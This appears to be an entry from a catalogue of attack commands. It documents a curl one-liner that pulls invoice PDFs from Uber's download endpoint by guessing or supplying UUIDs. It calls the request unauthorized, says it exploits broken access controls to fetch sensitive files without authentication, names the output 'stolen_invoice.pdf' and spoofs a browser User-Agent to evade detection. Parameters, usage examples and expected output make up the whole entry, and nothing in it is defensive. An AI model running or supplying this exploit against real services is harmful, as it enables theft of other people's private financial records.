---
data: >-
  curl -X GET "https://uber.com/api/invoice/download/{UUID}" -o
  stolen_invoice.pdf --header "User-Agent: Mozilla/5.0"
tags:
  - web-exploit
  - access-bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:36.654Z'
id: 033c9e22-3852-4eae-bc0e-0e19568d34f3
verified: false
validated: true
submitted: true
---
# curl-uuid-invoice-download

## Command

```bash
curl -X GET "https://uber.com/api/invoice/download/{UUID}" -o stolen_invoice.pdf --header "User-Agent: Mozilla/5.0"
```

## Description

This command uses curl to perform an unauthorized GET request to Uber's invoice download endpoint, replacing `{UUID}` with a target invoice identifier. It exploits broken access controls to retrieve sensitive PDF files without authentication, saving the output locally for inspection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| `"https://uber.com/api/invoice/download/{UUID}"` | The endpoint URL with UUID placeholder | Yes |
| `-o stolen_invoice.pdf` | Saves the response body to a file | Yes |
| `--header "User-Agent: Mozilla/5.0"` | Mimics a browser to avoid basic detection | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://uber.com/api/invoice/download/123e4567-e89b-12d3-a456-426614174000" -o invoice.pdf
```

### Advanced Usage

```bash
curl -X GET "https://uber.com/api/invoice/download/{UUID}" -o stolen_invoice.pdf --header "User-Agent: Mozilla/5.0" --silent --fail
```

Adds silent mode and fail on error for scripting.

## Expected Output

Successful execution downloads the invoice PDF to `stolen_invoice.pdf`. The terminal shows HTTP response headers (e.g., Content-Type: application/pdf, Content-Length: size). Errors return 404 for invalid UUIDs or 403 if patched.

## Related

- [[Related Procedure]]
